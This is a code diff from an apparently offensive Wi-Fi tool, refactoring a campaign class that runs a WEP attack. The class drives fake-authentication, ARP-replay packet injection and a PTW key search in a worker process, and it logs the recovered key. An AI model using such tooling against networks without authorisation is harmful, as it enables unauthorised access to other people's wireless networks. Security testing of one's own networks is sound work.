@@ -28,6 +28,7 @@ from rich.markup import escape
 
 from wifit3.engine.models import AccessPoint
 from wifit3.engine.attacks import treelog
+from wifit3.engine.attacks.campaign import Campaign
 from wifit3.engine.attacks.wep.fake_auth import WepFakeAuth
 from wifit3.engine.attacks.wep.arp_replay import WepArpReplay
 from wifit3.engine.attacks.wep.chopchop import WepChopChop
@@ -48,8 +49,11 @@ def _key_markup(key: bytes) -> str:
     return f"[bold black on cyan] ✓ CRACKED WEP KEY: {key.hex()}{ascii_hint} [/bold black on cyan]"
 
 
-class WepCampaign:
+class WepCampaign(Campaign):
     """Owns the fake-auth + ARP-replay lifecycle for one WEP target."""
+
+    button_id = "btn-gen-ivs"
+    key = "wep"
 
     def __init__(
         self,
@@ -57,7 +61,7 @@ class WepCampaign:
         target: AccessPoint,
         log_callback: Optional[Callable[[str], None]] = None,
     ):
-        self.iface = iface
+        super().__init__(ap=target, iface=iface)
         self.target = target
         self._log = log_callback or (lambda _m: None)
         self._active = False
@@ -68,7 +72,6 @@ class WepCampaign:
         self.recovered_key: Optional[bytes] = None
         self._crack_cursor = 0
         self._crack_started = False
-        self._crack_task: Optional[asyncio.Task] = None
         # The PTW search runs in a SEPARATE PROCESS — true parallelism past the
         # GIL, so it can peg a core without slowing the replay (which lives on
         # the main process's event loop + GIL-releasing USB I/O).
@@ -97,9 +100,11 @@ class WepCampaign:
             log_callback=self._log,
         )
 
-    def start(self) -> None:
-        if self._active:
-            return
+    async def _loop(self) -> None:
+        """Start the fake-auth + ARP-replay daemons, then supervise the PTW crack:
+        feed new crack samples and re-attempt recovery as IVs accumulate. The search
+        runs in a worker PROCESS (no GIL contention with replay). On success we stop
+        the TX — once we have the key there's no reason to keep injecting."""
         self._active = True
         self._log(
             f"[bold green]ARP Replay starting[/bold green] on "
@@ -108,19 +113,51 @@ class WepCampaign:
         self._log(treelog.leaf("[dim](deauth or chop if no ARPs appear)[/dim]"))
         self.fake_auth.start()
         self.replay.start()
-        # One reusable worker process for the crack search (spawns lazily on
-        # the first submit).
+        # One reusable worker process for the crack search (spawns lazily on the
+        # first submit).
         self._crack_pool = ProcessPoolExecutor(max_workers=1)
-        self._crack_task = asyncio.create_task(self._crack_loop())
         logger.info("[WEP-Campaign] Started on %s", self.target.bssid)
 
-    def stop(self) -> None:
-        if not self._active:
-            return
-        self._active = False
-        if self._crack_task:
-            self._crack_task.cancel()
-            self._crack_task = None
+        loop = asyncio.get_event_loop()
+        while not self.stopped and self.recovered_key is None:
+            # Crack cadence is ~3s, but poll self.stopped often so Stop is prompt —
+            # teardown (which halts replay TX) must not lag behind a long sleep.
+            for _ in range(15):
+                if self.stopped:
+                    return
+                await asyncio.sleep(0.2)
+            samples = self.iface.wep_store.crack_samples(self.target.bssid)
+            for iv, cipher in samples[self._crack_cursor:]:
+                self.cracker.feed(iv, keystream_from_arp_cipher(cipher))
+            self._crack_cursor = len(samples)
+            if not self.cracker.ready or self._crack_pool is None:
+                continue
+            if not self._crack_started:
+                self._crack_started = True
+                self._log(
+                    "[bold cyan]Cracking Key[/bold cyan] with "
+                    "[white]>10k IVs[/white] [dim](may require >40K)[/dim]"
+                )
+            # Ship the (picklable) cracker to the worker; it runs the search on a
+            # snapshot of the votes and returns the key, if any.
+            try:
+                key = await loop.run_in_executor(self._crack_pool, self.cracker.recover)
+            except Exception:
+                logger.exception("[WEP-Campaign] crack worker failed")
+                continue   # retry next tick on a fresh snapshot
+            if key is not None:
+                self.recovered_key = key
+                self.target.wep_key = key   # persist on the AP (Save / UI)
+                # The recovered key, as an unmissable cyan banner.
+                self._log(_key_markup(key))
+                # Done — stop transmitting (replay + fake-auth keepalive).
+                self.replay.stop()
+                self.fake_auth.stop()
+                return
+
+    async def teardown(self) -> None:
+        """Halt the crack pool + ChopChop + replay/fake-auth on every exit (was the
+        sync stop() body; the base owns the task lifecycle now)."""
         if self._crack_pool:
             # Don't block the UI waiting on an in-flight search — let the
             # worker process exit on its own.
@@ -136,53 +173,12 @@ class WepCampaign:
         # de-registering the forged STA.
         self.replay.stop()
         self.fake_auth.stop()
+        self._active = False
         # Quiet when we stopped because we WON — the key banner was already
         # logged; "stopped" right after would read as a failure.
         if self.recovered_key is None:
             self._log("[bold red]✗ Generate IVs stopped.[/bold red]")
         logger.info("[WEP-Campaign] Stopped on %s", self.target.bssid)
-
-    async def _crack_loop(self) -> None:
-        """Feed new crack samples to the PTW cracker and re-attempt recovery as
-        IVs accumulate. The search runs in a worker PROCESS (no GIL contention
-        with replay). On success we stop the TX — once we have the key there's
-        no reason to keep injecting."""
-        loop = asyncio.get_event_loop()
-        try:
-            while self._active and self.recovered_key is None:
-                await asyncio.sleep(3.0)
-                samples = self.iface.wep_store.crack_samples(self.target.bssid)
-                for iv, cipher in samples[self._crack_cursor:]:
-                    self.cracker.feed(iv, keystream_from_arp_cipher(cipher))
-                self._crack_cursor = len(samples)
-                if not self.cracker.ready or self._crack_pool is None:
-                    continue
-                if not self._crack_started:
-                    self._crack_started = True
-                    self._log(
-                        "[bold cyan]Cracking Key[/bold cyan] with "
-                        "[white]>10k IVs[/white] [dim](may require >40K)[/dim]"
-                    )
-                # Ship the (picklable) cracker to the worker; it runs the search
-                # on a snapshot of the votes and returns the key, if any.
-                try:
-                    key = await loop.run_in_executor(
-                        self._crack_pool, self.cracker.recover
-                    )
-                except Exception:
-                    logger.exception("[WEP-Campaign] crack worker failed")
-                    continue   # retry next tick on a fresh snapshot
-                if key is not None:
-                    self.recovered_key = key
-                    self.target.wep_key = key   # persist on the AP (Save / UI)
-                    # The recovered key, as an unmissable cyan banner.
-                    self._log(_key_markup(key))
-                    # Done — stop transmitting (replay + fake-auth keepalive).
-                    self.replay.stop()
-                    self.fake_auth.stop()
-                    return
-        except asyncio.CancelledError:
-            pass
 
     # ---- ChopChop sub-mode --------------------------------------------------
 
